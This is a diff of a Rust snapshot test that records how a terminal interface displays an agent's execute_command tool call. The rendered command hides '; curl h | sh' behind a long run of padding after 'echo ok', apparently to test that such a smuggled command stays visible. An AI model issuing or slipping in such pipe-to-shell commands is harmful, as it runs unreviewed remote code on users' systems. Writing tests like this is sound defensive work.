@@ -1,14 +1,14 @@
 ---
 source: src/tui/mod.rs
-expression: rendered.clone()
+expression: "&rendered"
 ---
 "> run it                                "
 "                                        "
+"execute_command({"command":...)  running"
 "Call execute_command {"command":"echo ok"
 "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
 "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; curl h |"
 " sh"}                                   "
-"                                        "
 "                                        "
 "                                        "
 "                                        "
